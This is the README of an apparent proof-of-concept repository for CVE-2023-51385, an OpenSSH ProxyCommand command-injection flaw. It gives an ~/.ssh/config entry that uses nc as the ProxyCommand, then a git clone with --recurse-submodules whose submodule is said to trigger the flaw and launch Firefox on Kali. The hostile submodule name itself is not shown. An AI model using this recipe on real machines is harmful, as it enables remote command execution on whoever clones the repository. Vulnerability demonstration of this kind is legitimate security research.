CVE-2023-51385
OpenSSH ProxyCommand RCE
[中文](README.zh.md)

<div align="center">
  <img src="https://github.com/WLaoDuo/CVE-2023-51385_poc/blob/main/pop%20firefox.gif", alt="" />
</div>

## 1.vim `~/.ssh/config`

```
host *.example.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
```

## 2. `git clone https://github.com/WLaoDuo/CVE-2023-51385_poc --recurse-submodules`

A submodule which would exploit this vulnerability to pop a firefox on kali.
